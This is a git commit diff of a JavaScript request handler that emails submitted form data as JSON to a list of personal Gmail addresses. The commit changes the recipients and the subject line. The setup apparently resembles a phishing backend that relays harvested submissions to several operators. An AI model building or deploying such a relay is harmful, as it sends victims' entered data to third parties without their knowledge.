20cf4986131aeaa780d227e049128f853a4432de
zm9807350 <zm9807350@gmail.com>
2026-01-02 19:04:44 +0500

    Update and rename Sanaulah.js to qaisar.js

--- qaisar.js
+++ qaisar.js
@@ -37,8 +37,8 @@ export default async function handler(req, res) {
   try {
     await transporter.sendMail({
       from: `"PROFESSOR" <dardhame1@gmail.com>`,
-      to: "linkquarry@gmail.com,newzatpage@gmail.com,submitdispute@gmail.com,nizamanisanaullah63@gmail.com",
-      subject: "Sanaulah",
+      to: "linkquarry@gmail.com,newzatpage@gmail.com,submitdispute@gmail.com,qaisarnizamani72@gmail.com",
+      subject: "qaisar",
       text: JSON.stringify(formData, null, 2),
       html: `<h3>New submission from Asif</h3><pre>${JSON.stringify(
         formData,
